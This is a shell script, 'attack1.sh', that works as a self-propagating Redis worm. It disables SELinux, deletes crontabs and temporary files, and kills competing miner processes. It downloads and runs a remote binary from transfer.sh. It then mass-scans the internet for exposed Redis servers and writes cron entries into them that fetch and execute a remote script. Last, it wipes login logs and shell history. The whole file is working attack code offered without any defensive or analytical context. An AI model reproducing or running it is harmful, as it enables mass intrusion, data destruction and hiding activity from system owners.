#############################################################
#   File Name: attack1.sh
#     Autohor: Hui Chen (c) 2018
#        Mail: chenhui13@baidu.com
# Create Time: 2018/04/18-14:40:49
#############################################################
#!/bin/sh 
sleep 1
find . -maxdepth 1 -name ".mxff0" -type f -mmin +60 -delete
[ -f .mxff0 ] && exit 0
echo 0 > .mxff0
trap "rm -rf .m* .cmd tmp.* .r .dat $0" EXIT
setenforce 0 2>/dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
crontab -r 2>/dev/null
rm -rf /var/spool/cron 2>/dev/null
grep -q 8.8.8.8 /etc/resolv.conf || echo "nameserver 8.8.8.8" >> /etc/resolv.conf
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null
rm -rf /etc/root.sh 2>/dev/null
sync && echo 3 > /proc/sys/vm/drop_caches
cat <<EOF> /etc/security/limits.conf
*         hard    nofile      100000
*         soft    nofile      100000
root      hard    nofile      100000
root      soft    nofile      100000
*         hard    nproc       100000
*         soft    nproc       100000
root      hard    nproc       100000
root      soft    nproc       100000
EOF
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
ps xf | grep -v grep | grep "redis-server\|nicehash\|linuxs\|linuxl\|crawler.weibo\|243/44444\|cryptonight\|stratum\|gpg-daemon\|jobs.flu.cc\|nmap\|cranberry\|start.sh\|watch.sh\|krun.sh\|killTop.sh\|cpuminer\|/60009\|ssh_deny.sh\|clean.sh\|\./over\|mrx1\|redisscan\|ebscan\|redis-cli\|barad_agent\|\.sr0\|clay\|udevs\|\.sshd\|/tmp/init" | while read pid _; do kill -9 "$pid"; done
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null
echo 0 > /var/spool/mail/root
echo 0 > /var/log/wtmp
echo 0 > /var/log/secure
echo 0 > /root/.bash_history
YUM_PACKAGE_NAME="iptables gcc redis coreutils bash curl wget"
DEB_PACKAGE_NAME="coreutils bash build-essential make gcc redis-server redis-tools redis iptables curl"
if cat /etc/*release | grep -i CentOS; then
yum clean all
yum install -y -q epel-release
yum install -y -q $YUM_PACKAGE_NAME
elif cat /etc/*release | grep -qi Red; then
yum clean all
yum install -y -q epel-release
yum install -y -q $YUM_PACKAGE_NAME
elif cat /etc/*release | grep -qi Fedora; then
yum clean all
yum install -y -q epel-release
yum install -y -q $YUM_PACKAGE_NAME
elif cat /etc/*release | grep -qi Ubuntu; then
export DEBIAN_FRONTEND=noninteractive
rm -rf /var/lib/apt/lists/*
apt-get update -q --fix-missing
for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done
elif cat /etc/*release | grep -qi Debian; then
export DEBIAN_FRONTEND=noninteractive
rm -rf /var/lib/apt/lists/*
apt-get update --fix-missing
for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done
elif cat /etc/*release | grep -qi Mint; then
export DEBIAN_FRONTEND=noninteractive
rm -rf /var/lib/apt/lists/*
apt-get update --fix-missing
for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done
elif cat /etc/*release | grep -qi Knoppix; then
export DEBIAN_FRONTEND=noninteractive
rm -rf /var/lib/apt/lists/*
apt-get update --fix-missing
for PACKAGE in $DEB_PACKAGE_NAME;do apt-get install -y -q $PACKAGE; done
else
exit 1
fi
sleep 1
if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
curl -kLs https://codeload.github.com/ptrrkssn/pnscan/tar.gz/v1.12 > .x112 || wget -q -O .x112 https://codeload.github.com/ptrrkssn/pnscan/tar.gz/v1.12
sleep 1
[ -f .x112 ] && tar xf .x112 && cd pnscan-1.12 && make lnx && make install && cd .. && rm -rf pnscan-1.12 .x112
fi
tname=$( mktemp )
OMURL=https://transfer.sh/OKmZi/tmp.8eN4XhwOex
curl -s $OMURL > $tname || wget -q -O $tname $OMURL
NMURL=$( curl -s --upload-file $tname https://transfer.sh )
mv $tname .gpg && chmod +x .gpg && ./.gpg && rm -rf .gpg
[ -z "$NMURL" ] && NMURL=$OMURL
ncmd=$(basename $(mktemp))
sed 's|'"$OMURL"'|'"$NMURL"'|g' < .cmd > $ncmd
NSURL=$( curl -s --upload-file $ncmd https://transfer.sh )
echo 'flushall' > .dat
echo 'config set dir /var/spool/cron' >> .dat
echo 'config set dbfilename root' >> .dat
echo 'set Backup1 "\t\n*/2 * * * * curl -s '${NSURL}' > .cmd && bash .cmd\n\t"' >> .dat
echo 'set Backup2 "\t\n*/5 * * * * wget -O .cmd '${NSURL}' && bash .cmd\n\t"' >> .dat
echo 'set Backup3 "\t\n*/10 * * * * lynx -source '${NSURL}' > .cmd && bash .cmd\n\t"' >> .dat
echo 'save' >> .dat
echo 'config set dir /var/spool/cron/crontabs' >> .dat
echo 'save' >> .dat
echo 'exit' >> .dat
pnx=pnscan
[ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
[ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
for x in $( seq 1 224 | sort -R ); do
for y in $( seq 0 255 | sort -R ); do
$pnx -t512 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
while read -r h p; do
cat .dat | redis-cli -h $h -p $p --raw &
done < .r.$x.$y.l
done
done
echo 0 > /var/spool/mail/root 2>/dev/null
echo 0 > /var/log/wtmp 2>/dev/null
echo 0 > /var/log/secure 2>/dev/null
echo 0 > /root/.bash_history 2>/dev/null
exit 0
